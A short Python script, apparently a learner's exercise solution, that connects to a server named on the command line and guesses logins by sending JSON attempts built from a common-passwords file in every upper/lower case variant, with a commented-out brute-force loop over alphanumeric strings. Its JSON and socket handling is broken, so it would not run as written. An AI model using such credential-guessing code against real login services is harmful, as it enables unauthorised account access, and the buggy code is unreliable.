import sys
import socket
import string
import itertools
import json
my_socket = socket.socket()


# obtaining args and conveying to the right format, then encoding
args = sys.argv
ip_address = args[1]
port = int(args[2])

char_num = list(string.ascii_lowercase) + list(string.digits)

# connect
# we need to connect only once, then send massages multiply times
def connect_server():
    address = (ip_address, port)
    my_socket.connect(address)


# reading file, send password, receive response
# instead of brute force search i used file with most common passwords.
# each letter of word in file i converted with lover/upper case with itertools.product
def get_response():
    '''for i in range(1, 10):
        for password in itertools.product(char_num, repeat=i):
            my_socket.send("".join(password).encode())
            response = my_socket.recv(1024)
            if response.decode() == "Connection success!":
                return "".join(password)
                exit()'''
    f = open('/Users/alcherniaev/Downloads/logins.txt', 'r')

    for line in f:
        for login in map(lambda x: "".join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in line.strip('\n')))):
            password = ' '
            json_sent = {"login": login, "password": password}
            with open("log_pas.json", "w") as json_file:
                json.dumps(json_sent, json_file)
            my_socket.send(json_file.encode())
            response = json.load(my_socket.recv(1024))
            if response.decode() == "Connection success!":
                f.close()
                return login
                exit()


connect_server()
print(get_response())


